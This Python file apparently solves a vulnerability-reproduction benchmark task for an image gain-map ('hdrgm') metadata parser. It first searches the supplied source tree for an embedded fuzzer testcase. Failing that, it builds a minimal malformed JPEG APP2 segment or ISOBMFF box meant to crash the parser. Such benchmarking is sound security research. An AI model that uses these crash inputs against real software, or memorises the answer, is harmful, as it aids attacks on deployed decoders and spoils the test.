import os
import re
import tarfile
import struct
from typing import Iterable, Tuple, Optional, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._find_embedded_poc(src_path)
        if poc is not None:
            return poc

        hints = self._infer_hints_from_source(src_path)
        if hints["direct_call"]:
            sig = hints["signature"] or "HDRGM"
            b = sig.encode("ascii", "ignore")[:16]
            if len(b) < 16:
                b += b"\x00" * (16 - len(b))
            return b

        if hints["format"] == "bmff":
            box_type = (hints["fourcc"] or "gmap").encode("ascii", "ignore")[:4]
            if len(box_type) < 4:
                box_type = (box_type + b"    ")[:4]
            return self._build_min_bmff_with_box(box_type)

        sig = hints["signature"] or "HDRGM"
        return self._build_min_jpeg_with_app(sig.encode("ascii", "ignore"), app_marker=0xE2, total_len=133)

    def _iter_fs_files(self, root: str) -> Iterable[Tuple[str, bytes]]:
        for base, _, files in os.walk(root):
            for fn in files:
                p = os.path.join(base, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if not os.path.isfile(p):
                    continue
                if st.st_size > 2_000_000:
                    continue
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                rel = os.path.relpath(p, root)
                yield rel, data

    def _iter_tar_files(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf:
                if not m.isreg():
                    continue
                if m.size > 2_000_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                finally:
                    try:
                        f.close()
                    except Exception:
                        pass
                yield m.name, data

    def _iter_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_fs_files(src_path)
            return
        if tarfile.is_tarfile(src_path):
            yield from self._iter_tar_files(src_path)
            return
        try:
            with open(src_path, "rb") as f:
                data = f.read()
            yield os.path.basename(src_path), data
        except OSError:
            return

    def _is_probably_text(self, data: bytes) -> bool:
        if not data:
            return True
        if b"\x00" in data:
            return False
        sample = data[:4096]
        nontext = 0
        for b in sample:
            if b in (9, 10, 13):
                continue
            if 32 <= b <= 126:
                continue
            nontext += 1
        return nontext / max(1, len(sample)) < 0.02

    def _find_embedded_poc(self, src_path: str) -> Optional[bytes]:
        name_re = re.compile(r"(clusterfuzz|testcase|minimized|poc|repro|crash|overflow|gainmap|hdrgm|42535447)", re.I)
        bin_exts = {
            ".jpg", ".jpeg", ".jpe", ".avif", ".heic", ".heif", ".bin", ".dat", ".raw", ".mp4", ".mov", ".m4a",
            ".jxl", ".png", ".webp", ".gif", ".tif", ".tiff",
        }

        best = None  # (score, size, data)
        for name, data in self._iter_files(src_path):
            lname = name.lower()
            ext = os.path.splitext(lname)[1]
            sz = len(data)
            if sz == 0:
                continue
            if sz > 65536 and not name_re.search(lname):
                continue

            score = 0
            if name_re.search(lname):
                score += 500
            if ext in bin_exts:
                score += 80
            if sz == 133:
                score += 200

            if data.startswith(b"\xFF\xD8"):
                score += 300
            if b"ftyp" in data[:128]:
                score += 250
            low = data.lower()
            if b"gain" in low:
                score += 120
            if b"hdr" in low:
                score += 120
            if b"hdrgm" in low:
                score += 200

            if self._is_probably_text(data) and score < 500:
                continue

            score += max(0, 200 - min(200, sz // 2))

            if best is None or score > best[0] or (score == best[0] and sz < best[1]):
                best = (score, sz, data)

        if best is None:
            return None

        if best[0] >= 700:
            return best[2]

        if best[1] == 133 and best[0] >= 300:
            return best[2]

        return None

    def _extract_string_literals(self, text: str) -> List[str]:
        out: List[str] = []
        for m in re.finditer(r'"([^"\\\n\r]{2,64})"', text):
            out.append(m.group(1))
        for m in re.finditer(r"'([^'\\\n\r]{4})'", text):
            out.append(m.group(1))
        for m in re.finditer(r'FOURCC\s*\(\s*"(.{4})"\s*\)', text):
            out.append(m.group(1))
        return out

    def _best_signature(self, candidates: List[str]) -> Optional[str]:
        best = None
        best_score = -1
        for s in candidates:
            if not s:
                continue
            if any(ord(ch) < 9 or ord(ch) > 126 for ch in s):
                continue
            score = 0
            ls = s.lower()
            if "hdrgm" in ls:
                score += 120
            if "hdr" in ls:
                score += 80
            if "gain" in ls:
                score += 80
            if "ultra" in ls or "uhdr" in ls:
                score += 60
            if "xmp" in ls or "adobe" in ls or "http" in ls:
                score += 30
            if 3 <= len(s) <= 8:
                score += 20
            if len(s) <= 16:
                score += 10
            if score > best_score:
                best_score = score
                best = s
        if best_score <= 0:
            return None
        return best

    def _best_fourcc(self, candidates: List[str]) -> Optional[str]:
        best = None
        best_score = -1
        for s in candidates:
            if len(s) != 4:
                continue
            if any(ord(ch) < 32 or ord(ch) > 126 for ch in s):
                continue
            score = 0
            ls = s.lower()
            if ls in ("ftyp", "meta", "moov", "mdat", "trak", "hdlr", "iloc", "iinf", "iprp", "ipco", "ipma"):
                score += 1
            if "gain" in ls:
                score += 80
            if "gmap" in ls:
                score += 80
            if "hdr" in ls:
                score += 60
            if "gm" in ls:
                score += 20
            if score > best_score:
                best_score = score
                best = s
        if best_score <= 0:
            return None
        return best

    def _infer_hints_from_source(self, src_path: str) -> dict:
        direct_call = False
        is_jpeg = False
        is_bmff = False
        found_literals: List[str] = []
        fourcc_literals: List[str] = []

        for name, data in self._iter_files(src_path):
            lname = name.lower()
            ext = os.path.splitext(lname)[1]
            if ext not in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".mm", ".m"):
                continue
            if len(data) > 2_000_000:
                continue
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                continue

            if "LLVMFuzzerTestOneInput" in text:
                if "decodeGainmapMetadata" in text or "decode_gainmap_metadata" in text:
                    direct_call = True
                if re.search(r"\b(jpeg|jpg|app1|app2)\b", text, re.I):
                    is_jpeg = True
                if re.search(r"\b(ftyp|isobmff|heif|heic|avif)\b", text, re.I):
                    is_bmff = True

            if "decodeGainmapMetadata" in text or "decode_gainmap_metadata" in text:
                window_hits = self._extract_string_literals(text)
                found_literals.extend(window_hits)
                for s in window_hits:
                    if len(s) == 4:
                        fourcc_literals.append(s)

                if re.search(r"\b(jpeg|app1|app2|0xffd8)\b", text, re.I):
                    is_jpeg = True
                if re.search(r"\b(ftyp|meta|box|isobmff|heif|heic|avif)\b", text, re.I):
                    is_bmff = True

            if not is_bmff and ("ftyp" in text or '"ftyp"' in text):
                is_bmff = True

        sig = self._best_signature(found_literals)
        fourcc = self._best_fourcc(fourcc_literals)

        fmt = "jpeg"
        if is_bmff and not is_jpeg:
            fmt = "bmff"
        elif is_bmff and is_jpeg:
            fmt = "jpeg"

        return {
            "direct_call": direct_call,
            "format": fmt,
            "signature": sig,
            "fourcc": fourcc,
        }

    def _build_min_jpeg_with_app(self, signature: bytes, app_marker: int = 0xE2, total_len: int = 133) -> bytes:
        if total_len < 8:
            total_len = 8
        payload_len = total_len - 8
        if payload_len < 0:
            payload_len = 0
        sig = signature.replace(b"\x00", b"")
        if not sig:
            sig = b"HDRGM"
        if len(sig) > payload_len:
            sig = sig[:payload_len]
        payload = sig
        if len(payload) < payload_len:
            payload += b"\x00" * (payload_len - len(payload))

        seg_len = payload_len + 2
        if seg_len > 0xFFFF:
            payload = payload[: 0xFFFF - 2]
            seg_len = len(payload) + 2

        out = bytearray()
        out += b"\xFF\xD8"
        out += b"\xFF" + bytes([app_marker & 0xFF])
        out += struct.pack(">H", seg_len)
        out += payload
        out += b"\xFF\xD9"
        return bytes(out)

    def _box(self, typ: bytes, payload: bytes) -> bytes:
        size = 8 + len(payload)
        if size > 0xFFFFFFFF:
            payload = payload[: 0xFFFFFFFF - 8]
            size = 8 + len(payload)
        return struct.pack(">I4s", size, typ) + payload

    def _build_min_bmff_with_box(self, child_type: bytes) -> bytes:
        ftyp_payload = b"mif1" + struct.pack(">I", 0) + b"mif1" + b"heic"
        ftyp = self._box(b"ftyp", ftyp_payload)

        child = self._box(child_type, b"")
        meta_payload = b"\x00\x00\x00\x00" + child
        meta = self._box(b"meta", meta_payload)
        return ftyp + meta